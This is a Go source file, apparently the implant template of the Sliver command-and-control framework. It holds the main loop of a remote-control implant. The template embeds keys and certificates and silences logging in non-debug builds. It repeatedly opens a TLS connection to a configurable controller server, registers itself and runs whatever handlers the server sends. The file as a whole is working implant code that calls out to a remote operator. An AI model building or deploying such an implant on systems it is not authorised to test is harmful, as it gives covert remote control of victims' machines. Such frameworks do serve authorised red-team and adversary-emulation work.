package main

import (
	"flag"
	"io"

	// {{if .Debug}}
	// {{else}}
	"io/ioutil"
	// {{end}}

	"log"
	"strconv"
	"time"

	pb "sliver/protobuf"
)

var (
	sliverName = `{{.Name}}`
	keyPEM     = `{{.Key}}`
	certPEM    = `{{.Cert}}`
	caCertPEM  = `{{.CACert}}`

	defaultServerIP = `{{.DefaultServer}}`

	timeout        = 30 * time.Second
	readBufSize    = 64 * 1024 // 64kb
	zeroReadsLimit = 10

	maxErrors = 100

	server *string
	lport  *int

	defaultServerLport = getDefaultServerLport()
)

func main() {

	// {{if .Debug}}
	log.SetFlags(log.LstdFlags | log.Lshortfile)
	// {{else}}
	log.SetFlags(0)
	log.SetOutput(ioutil.Discard)
	// {{end}}

	server = flag.String("server", defaultServerIP, "")
	lport = flag.Int("lport", defaultServerLport, "")
	flag.Usage = func() {}
	flag.Parse()

	// {{if .Debug}}
	log.Printf("Hello my name is %s", sliverName)
	// {{end}}

	connectionErrors := 0
	for connectionErrors < maxErrors {
		err := start()
		if err != nil {
			connectionErrors++
		}
		time.Sleep(30 * time.Second)
	}
}

func start() error {
	// {{if .Debug}}
	log.Printf("Connecting -> %s:%d", *server, uint16(*lport))
	// {{end}}
	conn, err := tlsConnect(*server, uint16(*lport))
	if err != nil {
		return err
	}
	defer conn.Close()
	registerSliver(conn)

	send := make(chan pb.Envelope)
	defer close(send)
	go func() {
		for envelope := range send {
			socketWriteEnvelope(conn, envelope)
		}
	}()

	handlers := getSystemHandlers()
	for {
		envelope, err := socketReadEnvelope(conn)
		if err == io.EOF {
			break
		}
		if err == nil {
			if handler, ok := handlers[envelope.Type]; ok {
				go handler.(func(chan pb.Envelope, []byte))(send, envelope.Data)
			}
		}
	}

	return nil
}

func getDefaultServerLport() int {
	lport, err := strconv.Atoi(`{{.DefaultServerLPort}}`)
	if err != nil {
		return 8888
	}
	return lport
}
